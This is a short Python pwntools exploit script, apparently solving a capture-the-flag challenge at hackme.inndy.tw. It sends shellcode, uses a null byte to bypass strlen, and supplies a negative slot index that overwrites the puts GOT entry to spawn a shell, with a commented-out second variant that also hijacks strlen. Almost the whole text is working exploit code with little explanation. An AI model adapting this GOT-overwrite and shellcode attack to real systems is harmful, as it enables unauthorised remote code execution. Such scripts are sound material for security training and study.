from pwn import *
context.log_level = 'debug'

conn = remote('hackme.inndy.tw',7715)

conn.recvuntil('message:\n')

shellcode = asm('add esp,0x36;jmp esp')   ##改写puts_got,eip跳转到0x08048641 push offset aWhichMessageSl 'Which message slot?' 接下来call puts
shellcode += '\x00'      #绕过strlen
shellcode += asm(shellcraft.sh()) #shellcode
 
conn.send(shellcode)

conn.recvuntil('slot?\n')

bss_addr = 0x0804A060
puts_got = 0x0804A020

#offset_puts_bss = -(bss_addr - puts_got) / 4
offset_puts_bss = -16

conn.send(' -16')

conn.interactive()

#exp 2
# from pwn import *
# context.log_level = 'debug'
# context(arch = 'i386')
# #p = process('leave_msg',env = {"LD_PRELOAD":"../libc-2.23.so.i386"})
# p = remote('hackme.inndy.tw',7715)

# #hijack strlen_got --> xor eax,eax ; ret
# p.recvuntil('message:\n')
# #gdb.attach(p,"b *" + str(0x0804861D))
# payload = asm('xor eax,eax ; ret')
# p.send(payload)
# p.recvuntil('slot?\n')
# p.send(' -15')

# #hijack puts_got --> shellcode
# p.recvuntil('message:\n')
# shellcode = asm(shellcraft.sh())
# p.send(shellcode)
# p.recvuntil('slot?\n')
# p.send(' -16')

# p.interactive()